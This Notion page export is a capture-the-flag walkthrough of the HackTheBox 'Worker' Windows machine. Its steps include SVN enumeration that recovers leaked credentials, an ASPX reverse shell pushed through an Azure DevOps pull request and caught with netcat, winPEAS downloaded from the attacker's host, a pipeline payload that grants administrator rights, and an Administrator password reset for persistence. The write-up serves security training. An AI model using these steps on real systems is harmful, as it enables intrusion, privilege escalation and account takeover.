{"children":[{"children":[],"uri":"https://www.notion.so/74121678886c4c86b9354482f58806fb","type":"heading","createdTime":1612329733783,"lastEditedTime":1612329733783,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/0cd37a6b956145dfbe3f8572eb1888b9","type":"text","createdTime":1612329733912,"lastEditedTime":1612329733912,"title":[["$ nmap -p- 10.10.10.203 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/d4266d66cd944afd8e03f5381038b5f5","type":"code","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["PORT     STATE SERVICE\n80/tcp   open  http\n3690/tcp open  svn\n5985/tcp open  wsman"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/4b118958c4b048b4a54dfc09e669bfda","type":"bulleted_list","createdTime":1612329733781,"lastEditedTime":1612329733781,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/4efe8a750f9d4c048a53f67697baa476","type":"text","createdTime":1612329733837,"lastEditedTime":1612329733837,"title":[["$ nmap -sC -sV -p 80,3690,5985 10.10.10.203 > scan.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/cf02e918a8144a24ab876e2784fa89c2","type":"code","createdTime":1612329733887,"lastEditedTime":1612329733887,"title":[["PORT     STATE SERVICE  VERSION\n80/tcp   open  http     Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n3690/tcp open  svnserve Subversion\n5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/ee5e5043905e4a8397b52e6a94dc9741","type":"text","createdTime":1612329733889,"lastEditedTime":1612329733889,"title":[["IIS HTTP, Subversion, HTTP/WinRM (?)."]]}],"uri":"https://www.notion.so/312a355b4073472192c6b98eaad9955a","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/fda378c5076f4b269491ac705a73ae1c","type":"heading","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/c547f245dba54ed79b8cb7256018b81d","type":"bulleted_list","createdTime":1612329733783,"lastEditedTime":1612329733783,"title":[["Brute force directories with DirBuster: Found nothing."]]},{"children":[{"children":[],"uri":"https://www.notion.so/e4d54a955d514960abb73104b25ab473","type":"text","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["$ nmap -p 3690 --script svn-brute 10.10.10.203",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b42ba6276e0f441793ffe85b6c8a3487","type":"code","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["PORT     STATE SERVICE\n3690/tcp open  svn\n|_svn-brute: No repository specified (see svn-brute.repo)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/2adafbbf0f31492b9ffef1a2ea6ec1f7","type":"bulleted_list","createdTime":1612329733781,"lastEditedTime":1612329733781,"title":[["Scan SVN with nmap's "],["svn-brute",[["c",null]]],[" script:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/5b529a58d6df4a0b960b3ed088e7954f","type":"text","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["$ nmap -p 3690 --script svn-brute --script-args svn-brute.repo=/svn/ 10.10.10.203",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/ddbb9c40258943de90ddc6ed35ea6b23","type":"code","createdTime":1612329733885,"lastEditedTime":1612329733885,"title":[["PORT STATE SERVICE\n3690/tcp open svn\n| svn-brute:\n|_ Anonymous SVN detected, no authentication needed"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/e020f299b18f401fa270812a5231a201","type":"text","createdTime":1612329733887,"lastEditedTime":1612329733887,"title":[["No auth needed on SVN."]]}],"uri":"https://www.notion.so/a84e996223fe4c93832207afeb313a77","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["No repository is specified, rescan using repo path "],["svn-brute.repo=/svn/",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/34d4732983be439f9c2d951218a24277","type":"text","createdTime":1612329733883,"lastEditedTime":1612329733883,"title":[["$ svn checkout svn://10.10.10.203",[["c",null]]]]}],"uri":"https://www.notion.so/9614610d16a7401fb099aaf3c6fb9de7","type":"bulleted_list","createdTime":1612329733781,"lastEditedTime":1612329733781,"title":[["Checkout repo:"]]},{"children":[],"uri":"https://www.notion.so/ae8e0078feef47e4a9ac3d14130f6f71","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Found repo name and possible domain name: "],["dimension.worker.htb",[["c",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/faa1c9f3496c4aa9a93283f6a04261ab","type":"text","createdTime":1612329733889,"lastEditedTime":1612329733889,"title":[["$ cat moved.txt",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/f7f9fb01cda24e758786a17c0338e0e3","type":"code","createdTime":1612329733889,"lastEditedTime":1612329733889,"title":[["This repository has been migrated and will no longer be maintaned here.\nYou can find the latest version at: "],["http://devops.worker.htb",[["a","http://devops.worker.htb/"]]],["\n\n// The Worker team :)"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/b8ef4b57764340ebba28114f8004ccf3","type":"bulleted_list","createdTime":1612329733783,"lastEditedTime":1612329733783,"title":[["Found file: "],["moved.txt",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/2fdd3d6de4184fd7848cd71a6ebe9c7e","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Found domain name: "],["devops.worker.htb",[["c",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/329557d131d444199cf337c60cf614ab","type":"text","createdTime":1612329733888,"lastEditedTime":1612329733888,"title":[["10.10.10.203 devops.worker.htb dimension.worker.htb",[["c",null]]]]}],"uri":"https://www.notion.so/7db06fec262a447c859a065333c5372b","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Adding found domains to "],["/etc/hosts",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6ec198eb5794408f81ea3230d6b51605","type":"text","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["devops.worker.htb",[["c",null]]],[" is a Azure DevOps server."]]},{"children":[],"uri":"https://www.notion.so/72ca4887e0a046de87d581be696c84a7","type":"code","createdTime":1612329733837,"lastEditedTime":1612329733837,"title":[["TF400813: Resource not available for anonymous access. Client authentication required."]],"language":"Plain Text","wrap":false},{"children":[],"uri":"https://www.notion.so/eb3a6ac056a04f1b973ec581dfaa58b6","type":"text","createdTime":1612329733884,"lastEditedTime":1612329733884,"title":[["dimension.worker.htb",[["c",null]]],[" is a standard webserver with links to projects."]]}],"uri":"https://www.notion.so/eb1f62f5d267478e8e05c46e96bf59a4","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Navigate to new domains:"]]},{"children":[],"uri":"https://www.notion.so/8f014d8b60654468ae5e350650a48631","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Found more domains on "],["dimension.worker.htb",[["c",null]]],[":\n"],["http://alpha.worker.htb/\n",[["a","http://alpha.worker.htb/"]]],["http://cartoon.worker.htb/\n",[["a","http://cartoon.worker.htb/"]]],["http://lens.worker.htb/\n",[["a","http://lens.worker.htb/"]]],["http://solid-state.worker.htb/\n",[["a","http://solid-state.worker.htb/"]]],["http://spectral.worker.htb/\n",[["a","http://spectral.worker.htb/"]]],["http://story.worker.htb/",[["a","http://story.worker.htb/"]]]]},{"children":[],"uri":"https://www.notion.so/c11c0b48892b43e89d0e84120c7e5cd9","type":"bulleted_list","createdTime":1612329733782,"lastEditedTime":1612329733782,"title":[["Found hidden directory "],[".svn",[["c",null]]],[", with "],["./wc.db",[["c",null]]],[" database file"]]},{"children":[],"uri":"https://www.notion.so/76f73abf02ea4b38a7c2157727a81380","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Found possible username: nathen"]]},{"children":[{"children":[],"uri":"https://www.notion.so/781c54401e5542b59899bb17dc42308b","type":"text","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["$ svn co -r 2 svn://10.10.10.203",[["c",null]]]]}],"uri":"https://www.notion.so/fb36d468bb9c4c6392c299c479573448","type":"bulleted_list","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["Checkout older version of repo:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/edcd390b62e84be490ec1c6ccf495417","type":"text","createdTime":1612329733912,"lastEditedTime":1612329733912,"title":[["$ cat deploy.ps1",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/2941002895774606b68fac8a2d769477","type":"code","createdTime":1612329733885,"lastEditedTime":1612329733885,"title":[["$user = \"nathen\"\n$plain = \"wendel98\"\n$pwd = ($plain | ConvertTo-SecureString)\n$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd\n$args = \"Copy-Site.ps1\"\nStart-Process powershell.exe -Credential $Credential -ArgumentList (\"-file $args\")"]],"language":"PowerShell","wrap":false}],"uri":"https://www.notion.so/b3f8dc0c097f4a2f9f4a58a18f908095","type":"bulleted_list","createdTime":1612329733908,"lastEditedTime":1612329733908,"title":[["Found "],["./deploy.ps1",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/065579e2a95e4e9981915214f0fee48d","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Found credentials: "],["nathen:wendel98",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/800973f3ebc741438f19f7c5299bb777","type":"bulleted_list","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["Try to login to Azure DevOps with credentials, success."]]},{"children":[],"uri":"https://www.notion.so/79c0b12288e74c06b7d8a263863657df","type":"bulleted_list","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["Try to evil-winrm with credentials, failed to connect."]]},{"children":[],"uri":"https://www.notion.so/5eeb2af0793a4bd8abfb7a29c052d0f3","type":"heading","createdTime":1612329733907,"lastEditedTime":1612329733907,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/4ca3ec982d1b428ca3cca76d26d317b7","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Azure DevOps has a feature to upload files onto repositories, but it must be done with a pull request on a separate branch."]]},{"children":[{"children":[],"uri":"https://www.notion.so/0a1ac9c412544727887c8f21eee29771","type":"text","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["$ nano ./shell.aspx",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/c1caf86c994b4e619d7dd468bef97f65","type":"code","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["String host = \"10.10.14.45\";\nint port = 6969;"]],"language":"C#","wrap":false}],"uri":"https://www.notion.so/c7b5586eddad4fce94dcd98ca6224391","type":"bulleted_list","createdTime":1612329733885,"lastEditedTime":1612329733885,"title":[["Using ASPX shell, modify the file to include local address and port."]]},{"children":[],"uri":"https://www.notion.so/14e9b295059446f09946bcdb3f35ce68","type":"bulleted_list","createdTime":1612329733906,"lastEditedTime":1612329733906,"title":[["Upload the shell onto a new branch of the "],["alpha",[["c",null]]],[" repo in the Hotel project, make sure to link the PR to a work item, create one if needed."]]},{"children":[{"children":[],"uri":"https://www.notion.so/30edc991f2814017b8952ed060c8748c","type":"image","createdTime":1612329733889,"lastEditedTime":1612329733889,"source":"https://i.imgur.com/HTQK3Ih.png?width=1227","caption":[],"width":1227,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.42053789731051344,"preserveScale":true}],"uri":"https://www.notion.so/deb04ca935fb49639f92de5d3359e7c0","type":"bulleted_list","createdTime":1612329733905,"lastEditedTime":1612329733905,"title":[["Self-approve PR and commit to master."]]},{"children":[{"children":[],"uri":"https://www.notion.so/4ecb54e1cccd44ab8488a00e1ac18c92","type":"text","createdTime":1612329733889,"lastEditedTime":1612329733889,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/8d18a2316fc6446297da5c51132c35fc","type":"bulleted_list","createdTime":1612329733911,"lastEditedTime":1612329733911,"title":[["Listen for a reverse shell with netcat:"]]},{"children":[],"uri":"https://www.notion.so/b5d9292fc1c54b5db70b0ad8dd37578d","type":"bulleted_list","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["Navigate to "],["http://alpha.worker.htb/shell.aspx",[["a","http://alpha.worker.htb/shell.aspx"]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/5ebc77b9b626457bbd8b0d812be31d8e","type":"text","createdTime":1612329733887,"lastEditedTime":1612329733887,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a23ac8c3887442179f2a471605958555","type":"code","createdTime":1612329733837,"lastEditedTime":1612329733837,"title":[["uid=4294967295(Unknown+User) gid=4294967295(Unknown+Group)"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/cceea9259d8e49849c990994914aa7bf","type":"text","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["$ whoami",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/8b88166ada5145a1b7aa1a1ec9cef2db","type":"code","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["iis apppool\\defaultapppool"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/be75c71580bf4adc8e0b47adf2eaeba5","type":"bulleted_list","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["Get shell under "],["iis",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/77bfb5c19a0647a995dfc8df9d39ea93","type":"bulleted_list","createdTime":1612329733908,"lastEditedTime":1612329733908,"title":[["Found usernames in "],["C:\\Users",[["c",null]]],[": restorer, robisl"]]},{"children":[{"children":[],"uri":"https://www.notion.so/40765402a0f842be950848827415e353","type":"text","createdTime":1612329733890,"lastEditedTime":1612329733890,"title":[["$ cp ./winPEAS.exe ../Worker/www/",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a5095bfffbac418a869a95155f284bdf","type":"text","createdTime":1612329733891,"lastEditedTime":1612329733891,"title":[["$ python3 -m SimpleHTTPServer",[["c",null]]]]}],"uri":"https://www.notion.so/b9b56c16faa64c7a868a3a312c93a48b","type":"bulleted_list","createdTime":1612329733912,"lastEditedTime":1612329733912,"title":[["Host winPEAS.exe on local HTTP:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3085ea976c7b48038a935a973f8e7f5f","type":"text","createdTime":1612329733884,"lastEditedTime":1612329733884,"title":[["$ cd C:\\Users\\Public\\Downloads\\",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/17bbdccb32524abba89e03ff6ab2bb39","type":"text","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["$ curl",[["c",null]]],["http://10.10.14.54:8000/winPEAS.exe",[["a","http://10.10.14.54:9090/winPEAS.exe"],["c",null]]],["> winPEAS.exe",[["c",null]]]]}],"uri":"https://www.notion.so/8b147f4680184a5d907e90323b3cc098","type":"bulleted_list","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["curl from host to local HTTP:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/0eeeae82e8d846e0ac22f52724079050","type":"text","createdTime":1612329733838,"lastEditedTime":1612329733838,"title":[["$ winPEAS.exe",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/f001675f88334c86a62b005cd556be78","type":"code","createdTime":1612329733887,"lastEditedTime":1612329733887,"title":[["[+] Looking AppCmd.exe\n[?] "],["https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe",[["a","https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe"]]],["\n\t\tAppCmd.exe was found in C:\\Windows\\system32\\inetsrv\\appcmd.exe You should try to search for credentials\n[+] Network Shares\n\t\tADMIN$ (Path: C:\\Windows)\n\t\tC$ (Path: C:\\)\n\t\tIPC$ (Path: )\n\t\tW$ (Path: W:\\)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/8fdd3e7159c1463aa7ef4636f38b2cbe","type":"bulleted_list","createdTime":1612329733884,"lastEditedTime":1612329733884,"title":[["Run winPEAS.exe:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3ff7bebe3cc4436fbeea965f0cd79933","type":"text","createdTime":1612329733911,"lastEditedTime":1612329733911,"title":[["$ smbclient -L 10.10.10.203",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a036cbff8a1a4c4b8bfc42ff0d5be493","type":"text","createdTime":1612329733912,"lastEditedTime":1612329733912,"title":[["Failed to connect."]]}],"uri":"https://www.notion.so/b20d55f4b7374445b35dabeb51b741d9","type":"bulleted_list","createdTime":1612329733906,"lastEditedTime":1612329733906,"title":[["Try to connect to "],["W$",[["c",null]]],[" share with smbclient:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/d11a5674a20a44d6a6703ca8e8329b95","type":"code","createdTime":1612329733885,"lastEditedTime":1612329733885,"title":[["[+] Drives Information\n[?] Remember that you should search more info inside the other drives\n\t\tC:\\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])\n\t\tW:\\ (Type: Fixed)(Volume label: Work)(Filesystem: NTFS)(Available space: 17 GB)(Permissions: Users [AppendData/CreateDirectories])"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/92a326c161484b1c9f55856a3fd807a6","type":"bulleted_list","createdTime":1612329733905,"lastEditedTime":1612329733905,"title":[["Investigate mysterious "],["W:\\",[["c",null]]],[" drive:"]]},{"children":[],"uri":"https://www.notion.so/b35a47fc60da4610b39eeb9f85a30c4f","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Go to "],["W:\\",[["c",null]]],[":\n"],["$ W:",[["c",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/0a7db865d7ad44ff9d916232bb84fa74","type":"code","createdTime":1612329733890,"lastEditedTime":1612329733890,"title":[["[aliases]\n# joe = /C=XZ/ST=Dessert/L=Snake City/O=Snake Oil, Ltd./OU=Research Institute/CN=Joe Average\n[groups]\n# harry_and_sally = harry,sally\n# harry_sally_and_joe = harry,sally,&joe\n# [/foo/bar]\n# harry = rw\n# &joe = r\n# * =\n# [repository:/baz/fuz]\n# @harry_and_sally = rw\n# * = r"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/4ad3c15f3c384b558ff1fed695f8acbd","type":"bulleted_list","createdTime":1612329733912,"lastEditedTime":1612329733912,"title":[["Found "],["W:\\svnrepos\\www\\conf\\authz",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2efe0a2a62c64bc58eb5379442be1f14","type":"code","createdTime":1612329733888,"lastEditedTime":1612329733888,"title":[["robisl = wolves11"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/af04de630c8e4ccfb221eb0cb03c011c","type":"bulleted_list","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["Found "],["W:\\svnrepos\\www\\conf\\passwd",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/3d1ec98744304b73b64494bf2f3d0891","type":"bulleted_list","createdTime":1612329733884,"lastEditedTime":1612329733884,"title":[["Found new credentials: "],["robisl:wolves11",[["c",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/6e062aef68794952a2ece47ff0c0385b","type":"text","createdTime":1612329733890,"lastEditedTime":1612329733890,"title":[["$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11",[["c",null]]]]}],"uri":"https://www.notion.so/e6125120258c442dae516ea4f664fe0c","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Remote into machine as robisl with evil-winrm:"]]},{"children":[],"uri":"https://www.notion.so/87ea0c612c2d4d8dbabc62637239dea7","type":"bulleted_list","createdTime":1612329733884,"lastEditedTime":1612329733884,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/fe7daab9d7d9471eb91cd5ee739179f8","type":"heading","createdTime":1612329733908,"lastEditedTime":1612329733908,"title":[["Privilege Escalation"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/999ec27ea5c34802814b8a31be1c1990","type":"text","createdTime":1612329733889,"lastEditedTime":1612329733889,"title":[["$ Get-ChildItem -Force",[["c",null]]]]}],"uri":"https://www.notion.so/97c34a81735d4530bc12afa36b6e2e57","type":"bulleted_list","createdTime":1612329733911,"lastEditedTime":1612329733911,"title":[["Check directory listings, "],["ls -la",[["c",null]]],[" equivalent on PowerShell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/60fa9ab901d646edb2c7e94f0405927c","type":"text","createdTime":1612329733886,"lastEditedTime":1612329733886,"title":[["$ whoami /priv",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/0c1ac5e409f84d1c9e6df717b920c93a","type":"text","createdTime":1612329733883,"lastEditedTime":1612329733883,"title":[["Nothing of interest..."]]}],"uri":"https://www.notion.so/4733ba29c0b147c7837aad2ccd167916","type":"bulleted_list","createdTime":1612329733906,"lastEditedTime":1612329733906,"title":[["Check user's privileged access, similar to "],["sudo -l",[["c",null]]],[" but on PowerShell:"]]},{"children":[],"uri":"https://www.notion.so/a028acb2b10746ba972de80fd462527a","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Login to Azure DevOps as robisl using new credentials."]]},{"children":[],"uri":"https://www.notion.so/a4e267e2470541628f1284662ca965ef","type":"bulleted_list","createdTime":1612329733907,"lastEditedTime":1612329733907,"title":[["Found new project in robisl's DevOps account: PartsUnlimited"]]},{"children":[],"uri":"https://www.notion.so/11c9d6f49c274b95b2fed17eacb08210","type":"bulleted_list","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["Using DevOps' Pipelines module, we can execute arbitrary code."]]},{"children":[{"children":[],"uri":"https://www.notion.so/88dba3c12ea645d48cd7999799f573c0","type":"image","createdTime":1612329733890,"lastEditedTime":1612329733890,"source":"https://i.imgur.com/ShDqoM1.png?width=1133","caption":[],"width":1133,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.5225066195939982,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/b18e4c37dc514c8da032d7954e669633","type":"code","createdTime":1612329733888,"lastEditedTime":1612329733888,"title":[["#pool = default\n\nsteps:\n\t- script:\n\t\t\tnet localgroup administrators robisl /add\n\t\t\ttype C:\\Users\\Administrator\\Desktop\\root.txt\n\t\tdisplayName: 'pwn'"]],"language":"YAML","wrap":false}],"uri":"https://www.notion.so/7d9f04134fa44234a314441751cea65f","type":"bulleted_list","createdTime":1612329733910,"lastEditedTime":1612329733910,"title":[["Create a new starter pipeline on an unspecified pool, add robisl to the administrators group and print "],["root.txt",[["c",null]]],[" flag:"]]},{"children":[],"uri":"https://www.notion.so/33e92fe0052c440bba232d54845b72ee","type":"bulleted_list","createdTime":1612329733905,"lastEditedTime":1612329733905,"title":[["Create pull request on a separate branch, create a new work item and self-approve the PR if needed."]]},{"children":[{"children":[],"uri":"https://www.notion.so/84a0a8fcfa374647adfb59b4fd70424b","type":"code","createdTime":1612329733888,"lastEditedTime":1612329733888,"title":[["Script contents:\nnet localgroup administrators robisl /add\n========================== Starting Command Output ===========================\n##[command]\"C:\\Windows\\system32\\cmd.exe\" /D /E:ON /V:OFF /S /C \"CALL \"w:\\agents\\agent11\\_work\\_temp\\7f15fa97-c09c-4b50-be25-fa598fdfa45a.cmd\"\"\nThe command completed successfully.\n##[command]\"C:\\Windows\\system32\\cmd.exe\" /D /E:ON /V:OFF /S /C \"CALL \"w:\\agents\\agent11\\_work\\_temp\\1fb5e08b-f36c-4bd4-8684-7895df0593ae.cmd\"\"\nf71dca4e----------------068f6546"]],"language":"YAML","wrap":false}],"uri":"https://www.notion.so/d6515679a7f9403b817da2505d5a5d99","type":"bulleted_list","createdTime":1612329733907,"lastEditedTime":1612329733907,"title":[["Run pipeline to execute the payload:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/7d2861f4442e4fabaf8116d2bf1839e5","type":"text","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["$ net user robisl",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/1fc086d8dca441f7959448370c6fd435","type":"code","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["Local Group Memberships *Administrators *Production\n*Remote Management Use\nGlobal Group memberships *None"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/b563275d99004f64b70d364f7747dde7","type":"bulleted_list","createdTime":1612329733907,"lastEditedTime":1612329733907,"title":[["Check new group permissions:"]]},{"children":[],"uri":"https://www.notion.so/b17c7490aadb434fba942032a23c9a0a","type":"bulleted_list","createdTime":1612329733909,"lastEditedTime":1612329733909,"title":[["Rob is now in the Administrators group."]]},{"children":[],"uri":"https://www.notion.so/2fe001a988404f3b837118a4d7d4e2e9","type":"bulleted_list","createdTime":1612329733911,"lastEditedTime":1612329733911,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/ce82617a9ab341b2b2b34603f7181a65","type":"heading","createdTime":1612329733905,"lastEditedTime":1612329733905,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/57890c64aeea48ae8974acd45675a9b4","type":"text","createdTime":1612329733883,"lastEditedTime":1612329733883,"title":[["$ net localgroup \"Remote Management Users\" administrator /add",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b3a2cc68a0f8459ab4c7abd6877cf74a","type":"text","createdTime":1612329733815,"lastEditedTime":1612329733815,"title":[["$ net user administrator mango1010!",[["c",null]]]]}],"uri":"https://www.notion.so/28330e29698e483c96de9f33acc4d3cc","type":"bulleted_list","createdTime":1612329733815,"lastEditedTime":1612329733815,"title":[["Change Administrator password and enable remote use:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/816077dce0444ca89f29ef4a244def21","type":"text","createdTime":1612329733888,"lastEditedTime":1612329733888,"title":[["$ evil-winrm -i 10.10.10.203 -u Administrator -p mango1010!",[["c",null]]]]}],"uri":"https://www.notion.so/be1996f46f1d459699998e99c6889d34","type":"bulleted_list","createdTime":1612329733913,"lastEditedTime":1612329733913,"title":[["Remote into Administrator with evil-winrm:"]]},{"children":[],"uri":"https://www.notion.so/db105b3c42aa48fa9cf2ca7ee317876c","type":"heading","createdTime":1612329733911,"lastEditedTime":1612329733911,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/1c2110e338a443b8b163f927bf9d4d5e","type":"numbered_list","createdTime":1612329733885,"lastEditedTime":1612329733885,"title":[["https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx",[["a","https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx"]]]]},{"children":[],"uri":"https://www.notion.so/cd0db8b319f0484db77842bdbcc3641a","type":"numbered_list","createdTime":1612329733908,"lastEditedTime":1612329733908,"title":[["https://www.youtube.com/watch?v=p7a25FEmd6A",[["a","https://www.youtube.com/watch?v=p7a25FEmd6A"]]]]},{"children":[],"uri":"https://www.notion.so/2976e01b4d64480db87d398d7bb0845b","type":"text","createdTime":1612329733906,"lastEditedTime":1612329733906,"title":[]}],"uri":"https://www.notion.so/2317ef12c2e040cb8d8e23059ced56ee","type":"page","createdTime":1612329734645,"lastEditedTime":1612334520000,"title":[["Worker - 10.10.10.203"]],"icon":"https://www.hackthebox.eu/storage/avatars/13358d0b09074485f107f36625b50a5c.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["htb\\worker"]],"98uZ":[["Medium-difficulty Windows box from HackTheBox, with a focus on exploiting Azure DevOps environment."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-02-03","start_time":"16:36"}]]]],"{iD?":[["Medium,Windows,Web Application,SVN,Azure DevOps"]],"|Ay0":[["post"]],"title":[["Worker - 10.10.10.203"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/270",[["a","https://www.hackthebox.eu/home/machines/profile/270"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2020-12-21","end_time":"02:32","time_zone":"Australia/Adelaide","start_date":"2020-12-20","start_time":"23:05"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}